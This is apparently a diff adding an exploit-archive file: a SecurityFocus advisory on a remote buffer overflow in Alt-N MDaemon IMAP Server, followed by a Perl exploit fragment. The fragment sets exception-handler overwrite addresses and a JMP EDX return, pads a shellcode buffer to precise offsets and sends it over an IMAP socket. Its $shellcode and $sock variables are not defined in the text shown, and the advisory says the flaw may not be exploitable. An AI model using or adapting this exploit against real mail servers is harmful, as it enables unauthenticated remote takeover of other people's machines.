@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/18129/info
+
+Alt-N MDaemon IMAP Server is susceptible to a remote buffer-overflow vulnerability. This issue is due to the application's failure to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.
+
+This issue allows remote, unauthenticated attackers to execute arbitrary machine code in the context of affected servers. This facilitates the complete compromise of affected computers.
+
+Specific information regarding affected versions is not currently available. This BID will be updated as further information is disclosed.
+
+UPDATE: The reporter of this issue states that this issue may not be exploitable. This BID may be retired in the future.
+
+$where = "\x4c\x14\xed\x77"; # UnhandledExceptionFilter 77ED144C
+#$where = "\x20\xf0\xfd\x7f"; # PEB Lock Pointer 7FFDF000
+$what = "\x3d\xb9\x82\x02"; # JMP EDX 03bfcb9A
+ 
+$nops = "A" x 100;
+$a = $nops . $shellcode . ("Z" x (0x2006-length($shellcode)-length($nops))) . $what . $where . ("Z" x (0x184AC - 0x200A - 12));
+print $sock "a001 \"$a\r\n";
+close($sock);
